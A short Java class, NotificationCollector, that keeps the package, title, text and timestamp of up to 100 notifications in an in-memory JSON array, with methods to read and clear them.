package com.alzahra.data;

import org.json.JSONArray;
import org.json.JSONObject;

public class NotificationCollector {
    private JSONArray notifications = new JSONArray();

    public void addNotification(String pkg, String title, String text) {
        try {
            JSONObject nt = new JSONObject();
            nt.put("package", pkg);
            nt.put("title", title);
            nt.put("text", text);
            nt.put("timestamp", System.currentTimeMillis());
            notifications.put(nt);
            
            if (notifications.length() > 100) {
                notifications.remove(0);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public JSONArray getNotifications() {
        return notifications;
    }

    public void clear() {
        notifications = new JSONArray();
    }
}
